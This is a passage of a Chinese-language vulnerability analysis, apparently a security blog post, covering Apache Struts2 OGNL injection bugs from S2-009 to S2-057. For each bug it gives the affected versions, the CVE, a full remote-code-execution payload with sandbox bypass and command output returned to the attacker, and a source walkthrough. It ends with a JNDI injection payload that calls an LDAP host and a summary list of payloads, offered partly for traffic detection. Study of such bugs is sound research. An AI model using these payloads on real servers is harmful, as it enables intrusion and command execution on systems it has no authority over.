这里也可以看出，如果配置的 `cookiesValue` 为 `*` 符号或者前端发送的cookieValue和配置中的一致，则会调用 `stack.setValue(cookieName, cookieValue);` ，这个方法底层执行了Ognl表达式，于是这里原理上是存在一个Ognl表达式注入的。但是没法打。为啥？因为： **Tomcat限制了特殊字符无法通过cookieName发送给后端，所以没法打** 。但是也不一定， **如果靶机的业务存在一个前置的URL解码，会解码CookieName，那么我们就可以使用URL编码来使用这个漏洞进行攻击了** 。

## S2-009

影响版本：Struts 2.0.0 - Struts 2.3.1.1

CVE编号：CVE-2011-3923

POC如下：

```java
// 下面的skillName代表后台String类型的参数
skillName=(#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('calc'))(meh)
&
(skillName)('pinger')=true
```

这个漏洞是对S2-005的绕过，S2-005主要增加了严格的参数名验证，无法再使用UNICODE进行绕过，但是它 **仅仅是对参数名进行了验证，没有对参数值进行验证** 。经过 `param=your_ognlExpression` 后，我们的恶意Ognl表达式会进入Ognl的上下文中（且可以通过验证，因为Struts2没有验证参数值，只验证了参数名），后续我们通过 `(param)(constName)=true` 即可调用前面存入上下文中的Ognl表达式，从而RCE。如下图所示：

![image-20210816134546841](/media/image-20210816134546841.png)

## S2-012

影响版本：Struts 2.0.0 - Struts 2.3.14.2

CVE编号：CVE-2013-1965

POC如下：

```java
// 无回显：
%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec('calc'))}

// 有回显：
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

这个漏洞发生在redirect位置，例如如下配置一个redirect：

```xml
<package name="S2-012" extends="struts-default">
   <action name="user" class="com.demo.action.UserAction">
      <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
      <result name="input">/index.jsp</result>
      <result name="success">/index.jsp</result>
   </action>
</package>
```

其中redirect地址中的 `${name}` 如果是攻击者可控的，那么将造成Ognl表达式注入，例如如下所示 `UserAction` 所示， `${name}` 就是攻击者可控的：

```java
public class UserAction extends ActionSupport {
    private String name;

    public UserAction() {}

    public void setName(String name) {
        this.name = name;
    }

    public String getName() {
        return this.name;
    }

    public String execute() throws Exception {
        return !this.name.isEmpty() ? "redirect" : "success";
    }
}
```

漏洞入口在 `org.apache.struts2.dispatcher.ServletRedirectResult#execute(ActionInvocation)` 方法。调用栈如下：

![image-20210816144225939](/media/image-20210816144225939.png)

这里可能会有一个疑问，不是从S2-001开始，就在 `com.opensymphony.xwork2.util.TextParseUtil#translateVariables()` 中限制解析的层数最多为1层了嘛，为啥这里还能二次解析 `${name}` 得到的值？首先看到代码：

```java
public static Object translateVariables(char[] openChars, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) {
    // deal with the "pure" expressions first!
    //expression = expression.trim();
    Object result = expression;
    for (char open : openChars) {
        int loopCount = 1;
        int pos = 0;

        //this creates an implicit StringBuffer and shouldn't be used in the inner loop
        final String lookupChars = open + "{";

        while (true) {
            int start = expression.indexOf(lookupChars, pos);
            if (start == -1) {
                pos = 0;
                loopCount++;
                start = expression.indexOf(lookupChars);
            }
            if (loopCount > maxLoopCount) {
                // translateVariables prevent infinite loop / expression recursive evaluation
                break;
            }
			// ......
		}
		// ......
	}
	// ......
}
```

这里看到，while循环外面其实还有一层循环，这个循环的层数取决于 `openChars` 的元素个数，这里其元素为 `'$', '%'` ，个数为2，所以能触发二次解析，且第二次解析的表达式必须为 `%{xxxx}` 格式。

## S2-013

影响版本：Struts 2.0.0 - Struts 2.3.14.1

CVE编号：CVE-2013-1966

POC如下：

```java
a=${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println('result='+new java.lang.String(#d)),#out.close()}
```

这个漏洞，需要启用 `<s:a>` 或者 `<s:url>` 标签中的 `includeParams` 属性，且这个属性的值必须为get或者all。

当`includeParams=all`的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行`OGNL`渲染，造成任意命令执行漏洞。一个例子如下：

```html
<p>Try add some parameters in URL</p>
<p><s:a id="link1" action="link" includeParams="all">"s:a" tag</s:a></p>
<p><s:url id="link2" action="link" includeParams="all">"s:url" tag</s:url></p>
```

漏洞发生在 `org.apache.struts2.views.util.UrlHelper#translateVariable(String)` 中：

![image-20210816151304731](/media/image-20210816151304731.png)

后续就是底层Ognl表达式的解析了，前面已经跟过，此处不再累赘。

## S2-015

影响版本：Struts 2.0.0 - Struts 2.3.14.2

CVE编号：CVE-2013-2135  CVE-2013-2134

POC如下：

```java
// POC1：如下POC贴在URL中
/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('calc').getInputStream()),#q}.action

// POC2：绕过S2-001的修复
your_param_name=%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()),#q}
```

对于POC1，主要是存在如下场景适用：

```java
<action name="*" class="com.demo.action.PageAction">
   <result>/{1}.jsp</result>
</action>
```

其中action的name为 `*` 符号，在 `org.apache.struts2.dispatcher.StrutsResultSupport#execute(ActionInvocation)` 中会对当前请求路径进行处理：

![image-20210816153036623](/media/image-20210816153036623.png)

跟进 `this.conditionalParse(this.location, invocation)` ：

```java
protected String conditionalParse(String param, ActionInvocation invocation) {
    return this.parse && param != null && invocation != null ? TextParseUtil.translateVariables(param, invocation.getStack(), new ParsedValueEvaluator() {
        public Object evaluate(String parsedValue) {
            if (StrutsResultSupport.this.encode && parsedValue != null) {
                try {
                    return URLEncoder.encode(parsedValue, "UTF-8");
                } catch (UnsupportedEncodingException var3) {
                    if (StrutsResultSupport.LOG.isWarnEnabled()) {
                        StrutsResultSupport.LOG.warn("error while trying to encode [" + parsedValue + "]", var3, new String[0]);
                    }
                }
            }

            return parsedValue;
        }
    }) : param;
}
```

可以看到第一行就是调用 `TextParseUtil#translateVariables()` 方法，这个方法底层会进行Ognl表达式解析，由此造成Ognl表达式注入。调用栈如下：

![image-20210816153329556](/media/image-20210816153329556.png)

对于POC2，主要的适用场景如下：

```java
<action name="param" class="com.demo.action.ParamAction">
    <result name="error">${message}</result>
    <result name="success" type="httpheader">
        <param name="error">305</param>
        <param name="headers.pinger">${message}</param>
    </result>
</action>
```

这个漏洞没啥好说的，至于为啥会解析 `${message}` 的值，因为攻击者传递的 `${message}` 值为：

```java
%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('calc').getInputStream()),#q}
```

是一个 `%{xxxx}` 结构的表达式，前面在S2-012的末尾也说明过，在 `com.opensymphony.xwork2.util.TextParseUtil#translateVariables()` 中限制解析的层数最多为1层了，但是其实可以绕，如果二次解析的表达式为 `%{xxxx}` 格式，就会触发二次解析，从而RCE。

POC1 RCE证明：

![image-20210816154403131](/media/image-20210816154403131.png)

POC2 RCE证明：

![image-20210816154624713](/media/image-20210816154624713.png)

## S2-016

影响版本：Struts 2.0.0 - Struts 2.3.15

CVE编号：CVE-2013-2251

POC如下：

```java
?redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("calc").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
```

这个漏洞的产生原因是：在`struts2`中，`DefaultActionMapper`类支持以 `action:` 、 `redirect:` 、 `redirectAction:` 作为导航或是重定向前缀，但是这些前缀后面同时可以跟 `OGNL` 表达式，由于 `struts2` 没有对这些前缀做过滤，导致利用`OGNL`表达式调用`java`静态方法执行任意系统命令。

如下所示（ `org.apache.struts2.dispatcher.StrutsResultSupport#conditionalParse(String, ActionInvocation)` ）：

![image-20210816160159675](/media/image-20210816160159675.png)

如果不带 `action:` 、 `redirect:` 、 `redirectAction:` 前缀，再次在 `org.apache.struts2.dispatcher.StrutsResultSupport#conditionalParse(String, ActionInvocation)` 打断点，发现不能携带Ognl表达式了：

![image-20210816160431300](/media/image-20210816160431300.png)

RCE证明：

![image-20210816160526664](/media/image-20210816160526664.png)

## S2-032

影响版本：Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)

CVE编号：CVE-2016-3081

POC如下：

```java
?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=calc
```

这个漏洞需要开启动态方法调用，才能支持method前缀：

```xml
<constant name="struts.enable.DynamicMethodInvocation" value="true" />
```

在 `org.apache.struts2.dispatcher.mapper.DefaultActionMapper#handleSpecialParameters(HttpServletRequest, ActionMapping)` 中将 `method:xxxxx` 的Ognl表达式部分添加到ActionMapping的method属性：

![image-20210816170503578](/media/image-20210816170503578.png)

后续在 `com.opensymphony.xwork2.DefaultActionInvocation#invokeAction(Object, ActionConfig)` 取出并进行Ognl表达式解析：

![image-20210816170730290](/media/image-20210816170730290.png)

RCE证明：

![image-20210816162313949](/media/image-20210816162313949.png)

**如果在渗透过程中，发现类似： `?student!add.action` 的链接，那么靶机必然开了动态方法调用。**

## S2-045

影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

CVE编号：CVE-2017-5638

POC如下：

```java
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='calc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data;
```

漏洞的产生原因主要是在使用基于Jakarta插件的文件上传功能时，如果攻击者使用异常的 `Content-Type` 值，在 `org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse(HttpServletRequest request, String saveDir)` 中会引发异常错误，并抛出一个 `LocalizedMessage` 错误：

![image-20210816174039754](/media/image-20210816174039754.png)

后续在 `org.apache.struts2.interceptor.FileUploadInterceptor#intercept(ActionInvocation invocation)` 处理异常：

```java
if (multiWrapper.hasErrors()) {
    Iterator i$ = multiWrapper.getErrors().iterator();

    while(i$.hasNext()) {
        LocalizedMessage error = (LocalizedMessage)i$.next();
        if (validation != null) {
            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));
        }
    }
}
```

这里看到调用了 `LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs())` 来处理异常信息，最终就是在这个方法内对异常信息中的Ognl表达式进行了解析，导致RCE。部分调用栈如下：

![image-20210816174522526](/media/image-20210816174522526.png)

RCE证明截图如下：

![image-20210816174607952](/media/image-20210816174607952.png)

## S2-046

影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

CVE编号：CVE-2017-5638

POC如下：

```java
// 注意：末尾的%00b需要手动进行URL解码再发送
Content-Disposition: form-data; name="upload"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='calc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}%00b"
```

这个漏洞的原理和S2-045是一样的，都是利用后台会使用Ognl解析报错信息导致RCE。这个漏洞的异常抛出位置如下：

![image-20210816181002324](/media/image-20210816181002324.png)

异常处理位置和S2-045是一样的：

![image-20210816181140122](/media/image-20210816181140122.png)

最终使用Ognl解析异常信息，因为异常信息中包含完整的Ognl表达式导致RCE：

![image-20210816181250528](/media/image-20210816181250528.png)

## S2-052

影响版本：Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

CVE编号：CVE-2017-9805

POC如下：

```xml
<!--需要设置请求包的Content-Type为application/xml-->
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>calc</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

这个漏洞其实是因为Struts2使用了 `XStreamHandler` 对前端传来的XML数据进行反序列化时未进行任何过滤，从而导致 `XStreamHandler` 反序列化漏洞。

首先看到 `struts2-rest-plugin-2.5.12.jar!\struts-plugin.xml` 中注册的 `ContentTypeHandler` ：

```xml
<bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="xml" class="org.apache.struts2.rest.handler.XStreamHandler" />
```

可以看到，如果Content-Type为application/xml，就会调用 `org.apache.struts2.rest.handler.XStreamHandler` 处理器来进行处理。我们在 `org.apache.struts2.rest.handler.ContentTypeHandler#intercept(ActionInvocation invocation)` 代码如下所示：

```java
public String intercept(ActionInvocation invocation) throws Exception {
    HttpServletRequest request = ServletActionContext.getRequest();
    ContentTypeHandler handler = selector.getHandlerForRequest(request);
    
    Object target = invocation.getAction();
    if (target instanceof ModelDriven) {
        target = ((ModelDriven)target).getModel();
    }
    
    if (request.getContentLength() > 0) {
        InputStream is = request.getInputStream();
        InputStreamReader reader = new InputStreamReader(is);
        handler.toObject(reader, target);
    }
    return invocation.invoke();
}
```

逻辑很简单， `ContentTypeHandler handler = selector.getHandlerForRequest(request)` 就是根据Content-Type获取对应的处理器，由于我们的Content-Type为application/xml，所以这里获取的就是 `XStreamHandler` 对象，最后调用 `handler.toObject(reader, target)` 对请求进行处理。所以我们继续跟进 `XStreamHandler#toObject(reader, target)` ：

```java
public void toObject(Reader in, Object target) {
    XStream xstream = createXStream();
    xstream.fromXML(in, target);
}
```

发现就是很直接的Xstream反序列化。

![image-20210816184345338](/media/image-20210816184345338.png)

## S2-053

影响版本：Struts 2.0.0 - 2.3.33 Struts 2.5 - Struts 2.5.10.1

CVE编号：CVE-2017-12611

POC如下：

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

这个漏洞其实归根结底还是由于 **Struts2自定义标签的解析导致的漏洞** 。

网上大部分人说的：“Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成一个表达式，被OGNL解析第二次，导致任意命令执行漏洞”。并不完全正确，正确的理解应该是： **Struts2的自定义标签进行渲染之前，由于模板会被Freemarker提前解析渲染一次，所以Struts2自定义标签会渲染Freemarker解析后得到的恶意Ognl表达式** 。

例如如下ftl模板文件：

```html
<html>
<head>
<title>S2-053 Demo</title>
</head>
<body>
<h1>S2-053 Demo</h1>
<hr/>
Your name: <@s.url value="${name}"/>
<hr/>
Enter your name here:<br/>
<form action="" method="get">
<input type="text" name="name" value="" />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```

其中存在使用Struts2的自定义标签： `<@s.url value="${name}"/>` ，但是标签进行渲染之前，其中的 `${name}` 会先经过freemarker解析一遍，如下所示，就是freemarker解析 `${name}` 的值并进行输出：

![image-20210817145324318](/media/image-20210817145324318.png)

继续跟进到 `env.getOut().write()` 中，发现解析 `${name}` 后得到的值就是我们的恶意Ognl表达式：

![image-20210817145524666](/media/image-20210817145524666.png)

按道理此时freemarker的解析就结束了，这个Ognl表达式也不会被freemarker进行解析，但是解析出来的这个Ognl表达式存在位置特殊，这个解析出来的Ognl表达式在Struts2的自定义标签的value属性中：

```html
<@s.url value="${name}"/>
```

可以看到，这里使用了Struts2的自定义标签，所以经过freemarker解析后，这个标签实际上就相当于：

```html
<@s.url value="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
"/>
```

此时再被Struts2的标签进行处理，由于标签存在Ognl表达式注入，所以造成漏洞；

这个标签的处理类为 `org.apache.struts2.components.URL` ，漏洞触发点在其 `start(Writer writer)` 方法。调用栈如下：

![image-20210817150451734](/media/image-20210817150451734.png)

RCE证明如下：

![image-20210817150540591](/media/image-20210817150540591.png)

## S2-057

影响版本：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16

CVE编号：CVE-2018-11776

POC如下：

```java
/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action

/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action
```

这个漏洞需要存在类似如下的配置：

```xml
<struts>
    <constant name="struts.mapper.alwaysSelectFullNamespace" value="true"/>
    <constant name="struts.devMode" value="false"/>
    <constant name="struts.enable.DynamicMethodInvocation" value="false" />
    <package name="struts2" extends="struts-default">
        <action name="index" class="demo.Index">
            <result type="redirectAction" name="SUCCESS">
                <param name="actionName">test</param>
            </result>
        </action>
    </package>

    <package name="struts3" extends="struts-default">
        <action name="test" class="demo.Index">
            <result type="freemarker" name="SUCCESS">/WEB-INF/ftl/index.ftl</result>
        </action>
    </package>
</struts>
```

主要是需要配置如下两个配置：

```xml
<constant name="struts.mapper.alwaysSelectFullNamespace" value="true"/>

<result type="redirectAction" name="SUCCESS">
    <param name="actionName">test</param>
</result>
```

关于 `<constant name="struts.mapper.alwaysSelectFullNamespace" value="false"/>` 的配置，一些说明如下：

- 这个配置用来设置是否 **允许采用完整的命名空间** ，当配置为true时，即 **设置命名空间必须进行精确匹配** ；
- 进行精确匹配时要求请求url中的命名空间必须与配置文件中配置的某个命名空间必须相同，如果没有找到相同的则匹配失败；
- 进行精确匹配时，以最后一个 `/` 为分隔符，左边的为namespace，右边的为action；

例如URL为： `http://localhost:8080/myproject/home/actionName!method.action` ，那么进行精确匹配时，namespace就为home。

然后这个漏洞的产生点是 `<result type="redirectAction" name="SUCCESS">` 中配置的 `redirectAction` 。其实这个漏洞还有其他两个result type可以触发：

- type="chain"
- type="postback"

这里我们以 `type="redirectAction"` 为例进行分析。发送POC后，直接看到 `type="redirectAction"` 对应的 `org.apache.struts2.result.ServletActionRedirectResult#execute(ActionInvocation invocation)` 方法：

```java
public void execute(ActionInvocation invocation) throws Exception {
    actionName = conditionalParse(actionName, invocation);
    if (namespace == null) {
        namespace = invocation.getProxy().getNamespace();
    } else {
        namespace = conditionalParse(namespace, invocation);
    }
    if (method == null) {
        method = "";
    } else {
        method = conditionalParse(method, invocation);
    }

    String tmpLocation = actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null));

    setLocation(tmpLocation);

    super.execute(invocation);
}
```

因为前面配置了必须精确匹配命名空间，所以这里 `namespace = invocation.getProxy().getNamespace()` 获取到的就是攻击者在URL中填写的恶意Ognl表达式：

![image-20210817162036486](/media/image-20210817162036486.png)

最终从 `super.execute(invocation)` 一直到如下代码：

![image-20210817162203005](/media/image-20210817162203005.png)

跟进 `conditionalParse(location, invocation)` ，可以看到，又到了 `TextParseUtil.translateVariables()` ，这是个分析过很多次的Ognl表达式RCE Sink了，底层进行了Ognl表达式解析，从而触发RCE，这里不再分析底层调用了：

![image-20210817162426585](/media/image-20210817162426585.png)

RCE证明如下：

![image-20210817162512882](/media/image-20210817162512882.png)

## 总结

这里匆匆忙忙过了一遍Ognl的注入点，但是其实，找到Ognl表达式注入点，可能还得绕沙箱（没有过多分析沙箱绕过，大多数只分析了Ognl表达式注入点）。值得一提的是S2-061中pwntester提出的 `org.apache.tomcat.InstanceManager` 的这个Gadget，有非常强的扩展性。（conf velocity沙箱逃逸那个RCE漏洞中也用到了）。例如：

```java
// 以下为调用栈，非直接利用的POC
(#UnicodeSec = #application['org.apache.tomcat.InstanceManager'])
(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap'))
(#stackvalue=#attr['struts.valueStack'])
(#potats0.setBean(#stackvalue))
(#context=#potats0.get('context'))
(#potats0.setBean(#context))
(#sm=#potats0.get('memberAccess'))
(#emptySet=#UnicodeSec.newInstance('java.util.HashSet'))
(#potats0.setBean(#sm))
(#potats0.put('excludedClasses',#emptySet))
(#potats0.put('excludedPackageNames',#emptySet))
(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute'))
(#cmd={'whoami'})
(#res=#exec.exec(#cmd))
```

它可以直接无视沙箱new一个对象，这样就有很多可能性了。扩展下也可以使用这个Gadget构造一个JNDI注入：

```
%{(#InstanceManager = #application['org.apache.tomcat.InstanceManager']).(#rw=#InstanceManager.newInstance('com.sun.rowset.JdbcRowSetImpl')).(#rw.setDataSourceName('ldap://192.168.3.254:10086/InstanceManager')).(#rw.getDatabaseMetaData())}
```

## 流量特征

首先汇总下目前已知的POC：

```java
// S2-005之前，没有沙箱，可以直接Ognl执行命令
// 所以S2-005之前无需沙箱绕过
%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()}

%{@java.lang.Runtime@getRuntime().exec("calc")}

// 以及一些S2-005之前的非RCE Payload如下
%{"tomcatBinDir{" @java.lang.System@getProperty("user.dir") "}"}

%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

// S2-005开始，存在沙箱，此时Ognl表达式注入需要绕沙箱（通过Ognl关闭沙箱）
// Struts2的OgnlContext配置的沙箱处理器为SecurityMemberAccess
// 对应于OgnlContext的_memberAccess属性
// 此外，Struts2还通过配置denyMethodExecution来判定是否允许Ognl执行函数
// 所以从S2-005开始，POC都是类似如下形式：
// 利用Ognl将denyMethodExecution设置为true，同时拿到_memberAccess，将其中的安全配置清空
('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)
&
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023mycmd\u003d\'calc\'')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)

// 或者一些基于上面思想的带回显POC
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)
&
('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)
&
('\u0023mycmd\u003d\'whoami\'')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)
&
(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))
&
(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))
&
(C)(('\u0023mydat.readFully(\u0023myres)')(bla))
&
(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))
&
('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)
&
(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))

// 后续还出现了利用OgnlUtil关闭沙箱的POC
